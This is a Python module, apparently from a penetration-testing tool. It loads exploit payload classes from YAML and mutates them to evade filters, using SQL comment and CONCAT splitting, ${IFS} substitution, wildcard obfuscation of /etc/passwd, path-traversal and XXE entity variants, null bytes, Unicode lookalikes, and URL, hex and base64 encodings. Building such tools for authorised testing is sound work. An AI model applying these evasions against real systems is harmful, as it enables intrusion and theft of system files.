"""Payload mutator — generates and mutates exploit payloads dynamically.

MOD-11.5: Loads payload definitions from YAML and applies mutation
and encoding strategies to generate diverse payload variants for
adaptive exploit testing.
"""

from __future__ import annotations

__classification__ = "experimental"

import base64
import logging
import random
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import yaml

logger = logging.getLogger(__name__)

_PAYLOADS_PATH = Path(__file__).parent.parent / "knowledge" / "payloads.yaml"


@dataclass
class PayloadSet:
    """A payload class loaded from YAML."""

    name: str
    description: str
    payloads: list[str]
    mutations: list[str]
    encodings: list[str]


@dataclass
class MutatedPayload:
    """A single mutated payload variant."""

    original: str
    mutated: str
    mutation_applied: str    # mutation or encoding name
    payload_class: str       # sql_injection | command_injection | ...

    def to_dict(self) -> dict:
        return {
            "original": self.original,
            "mutated": self.mutated,
            "mutation": self.mutation_applied,
            "class": self.payload_class,
        }


class PayloadMutator:
    """Generates and mutates exploit payloads.

    Usage::

        mutator = PayloadMutator()
        variants = mutator.generate("sql_injection", max_variants=10)
    """

    def __init__(self, payloads_path: Path | str | None = None) -> None:
        self._payloads_path = Path(payloads_path) if payloads_path else _PAYLOADS_PATH
        self._payload_sets: dict[str, PayloadSet] = {}
        self._load()

    @property
    def payload_classes(self) -> list[str]:
        return sorted(self._payload_sets.keys())

    @property
    def total_base_payloads(self) -> int:
        return sum(len(ps.payloads) for ps in self._payload_sets.values())

    def _load(self) -> None:
        """Load payload definitions from YAML."""
        if not self._payloads_path.exists():
            logger.warning("Payloads file not found: %s", self._payloads_path)
            return

        with open(self._payloads_path) as f:
            data = yaml.safe_load(f)

        if not data or "payload_classes" not in data:
            return

        for raw in data["payload_classes"]:
            try:
                ps = PayloadSet(
                    name=raw["name"],
                    description=raw.get("description", ""),
                    payloads=raw.get("payloads", []),
                    mutations=raw.get("mutations", []),
                    encodings=raw.get("encodings", []),
                )
                self._payload_sets[ps.name] = ps
            except (KeyError, TypeError) as e:
                logger.warning("Failed to parse payload set: %s", e)

        logger.info("Loaded %d payload classes with %d base payloads",
                     len(self._payload_sets), self.total_base_payloads)

    def get_base_payloads(self, payload_class: str) -> list[str]:
        """Get base payloads for a vulnerability class."""
        ps = self._payload_sets.get(payload_class)
        return list(ps.payloads) if ps else []

    def generate(
        self,
        payload_class: str,
        *,
        max_variants: int = 20,
        include_base: bool = True,
    ) -> list[MutatedPayload]:
        """Generate mutated payload variants for a vulnerability class.

        Returns a mix of base payloads, mutations, and encoded variants.
        """
        ps = self._payload_sets.get(payload_class)
        if not ps:
            return []

        variants: list[MutatedPayload] = []

        # Include base payloads
        if include_base:
            for payload in ps.payloads[:max_variants]:
                variants.append(MutatedPayload(
                    original=payload,
                    mutated=payload,
                    mutation_applied="none",
                    payload_class=payload_class,
                ))

        # Apply mutations
        for payload in ps.payloads:
            if len(variants) >= max_variants:
                break
            for mutation in ps.mutations:
                if len(variants) >= max_variants:
                    break
                mutated = self._apply_mutation(payload, mutation)
                if mutated != payload:
                    variants.append(MutatedPayload(
                        original=payload,
                        mutated=mutated,
                        mutation_applied=mutation,
                        payload_class=payload_class,
                    ))

        # Apply encodings
        for payload in ps.payloads:
            if len(variants) >= max_variants:
                break
            for encoding in ps.encodings:
                if len(variants) >= max_variants:
                    break
                encoded = self._apply_encoding(payload, encoding)
                if encoded != payload:
                    variants.append(MutatedPayload(
                        original=payload,
                        mutated=encoded,
                        mutation_applied=f"encode:{encoding}",
                        payload_class=payload_class,
                    ))

        logger.info(
            "Generated %d variants for %s (%d base)",
            len(variants), payload_class, len(ps.payloads),
        )
        return variants[:max_variants]

    # ── Mutation implementations ─────────────────────────────────

    def _apply_mutation(self, payload: str, mutation: str) -> str:
        """Apply a mutation strategy to a payload."""
        dispatch = {
            "inline_comments": self._mut_inline_comments,
            "case_variation": self._mut_case_variation,
            "whitespace_mutation": self._mut_whitespace,
            "double_encoding": self._mut_double_encoding,
            "concat_bypass": self._mut_concat_bypass,
            "null_byte_injection": self._mut_null_byte,
            "variable_expansion": self._mut_variable_expansion,
            "wildcard_bypass": self._mut_wildcard,
            "newline_injection": self._mut_newline,
            "pipe_variation": self._mut_pipe_variation,
            "unicode_bypass": self._mut_unicode_bypass,
            "dot_variation": self._mut_dot_variation,
            "slash_variation": self._mut_slash_variation,
            "encoding_declaration": self._mut_encoding_declaration,
            "parameter_entity": self._mut_parameter_entity,
        }
        fn = dispatch.get(mutation)
        if fn:
            return fn(payload)
        return payload

    def _mut_inline_comments(self, payload: str) -> str:
        for kw in ["SELECT", "UNION", "OR", "AND", "FROM", "WHERE"]:
            payload = payload.replace(kw, f"/**/{kw}/**/")
            payload = payload.replace(kw.lower(), f"/**/{kw.lower()}/**/")
        return payload

    def _mut_case_variation(self, payload: str) -> str:
        return "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )

    def _mut_whitespace(self, payload: str) -> str:
        return payload.replace(" ", "\t")

    def _mut_double_encoding(self, payload: str) -> str:
        first = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(first, safe="")

    def _mut_concat_bypass(self, payload: str) -> str:
        for kw in ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE"]:
            if kw in payload.upper():
                mid = len(kw) // 2
                replacement = f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
                payload = payload.replace(kw, replacement)
                payload = payload.replace(kw.lower(), replacement)
        return payload

    def _mut_null_byte(self, payload: str) -> str:
        return payload + "%00"

    def _mut_variable_expansion(self, payload: str) -> str:
        return payload.replace(" ", "${IFS}")

    def _mut_wildcard(self, payload: str) -> str:
        return payload.replace("/etc/passwd", "/e?c/p?sswd")

    def _mut_newline(self, payload: str) -> str:
        return "%0a" + payload

    def _mut_pipe_variation(self, payload: str) -> str:
        return payload.replace("| ", "|| ")

    def _mut_unicode_bypass(self, payload: str) -> str:
        replacements = {"<": "\uff1c", ">": "\uff1e", "'": "\uff07"}
        for old, new in replacements.items():
            payload = payload.replace(old, new)
        return payload

    def _mut_dot_variation(self, payload: str) -> str:
        return payload.replace("../", "....//")

    def _mut_slash_variation(self, payload: str) -> str:
        return payload.replace("/", "\\")

    def _mut_encoding_declaration(self, payload: str) -> str:
        return payload.replace('<?xml version="1.0"?>', '<?xml version="1.0" encoding="UTF-16"?>')

    def _mut_parameter_entity(self, payload: str) -> str:
        return payload.replace("<!ENTITY xxe", "<!ENTITY % xxe")

    # ── Encoding implementations ─────────────────────────────────

    def _apply_encoding(self, payload: str, encoding: str) -> str:
        """Apply an encoding strategy to a payload."""
        dispatch = {
            "url": self._enc_url,
            "double_url": self._enc_double_url,
            "hex": self._enc_hex,
            "unicode": self._enc_unicode,
            "base64": self._enc_base64,
            "utf16": self._enc_utf16,
        }
        fn = dispatch.get(encoding)
        if fn:
            return fn(payload)
        return payload

    def _enc_url(self, payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    def _enc_double_url(self, payload: str) -> str:
        first = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(first, safe="")

    def _enc_hex(self, payload: str) -> str:
        return "0x" + payload.encode().hex()

    def _enc_unicode(self, payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def _enc_base64(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    def _enc_utf16(self, payload: str) -> str:
        return base64.b64encode(payload.encode("utf-16")).decode()
